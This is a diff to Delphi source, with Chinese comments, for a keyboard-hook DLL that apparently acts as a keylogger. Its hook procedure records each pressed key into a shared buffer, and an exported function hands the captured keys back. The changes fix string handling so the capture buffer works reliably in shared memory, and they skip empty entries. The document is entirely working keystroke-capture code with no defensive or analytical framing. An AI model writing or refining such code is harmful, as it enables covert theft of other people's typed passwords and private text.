@@ -13,7 +13,7 @@ const
 type
   //共享数据结构
   TShared = record
-    Keys: array[0..BUFFER_SIZE - 1] of string;
+    Keys: array[0..BUFFER_SIZE - 1] of ShortString;
     KeyCount: Integer;
   end;
   //共享数据结构指针
@@ -31,7 +31,7 @@ function KeyHookProc(iCode: Integer; wParam: WPARAM; lParam: LPARAM): LRESULT;
   stdcall; export;
 var
   vKey: Integer;
-  TmpStr: string;
+  TmpStr: ShortString;
 begin
   if iCode < 0 then
     Result := CallNextHookEx(hOldKeyHook, iCode, wParam, lParam)
@@ -44,6 +44,8 @@ begin
       //判断按键是否处于按下状态
       if GetAsyncKeyState(vKey) = -32767 then
       begin
+        TmpStr := '';
+
         case vKey of
           13:  TmpStr := '[Enter]';
 
@@ -84,13 +86,16 @@ begin
                TmpStr := IntToStr(vKey - 96);
         end;
 
-        //将获取的按键信息写入缓冲区
-        Shared^.Keys[Shared^.KeyCount] := TmpStr;
-        Inc(Shared^.KeyCount);
+        if TmpStr <> '' then
+        begin
+          //将获取的按键信息写入缓冲区
+          Shared^.Keys[Shared^.KeyCount] := TmpStr;
+          Inc(Shared^.KeyCount);
 
-        //缓冲区满时清空
-        if Shared^.KeyCount > BUFFER_SIZE - 1 then
-          Shared^.KeyCount := 0;
+          //缓冲区满时清空
+          if Shared^.KeyCount > BUFFER_SIZE - 1 then
+            Shared^.KeyCount := 0;
+        end;
       end;
     end;
 
@@ -133,7 +138,7 @@ begin
 end;
 
 //返回指定按键
-function GetKey(Index: Integer): string; export;
+function GetKey(Index: Integer): ShortString; export;
 begin
   Result := '';
 
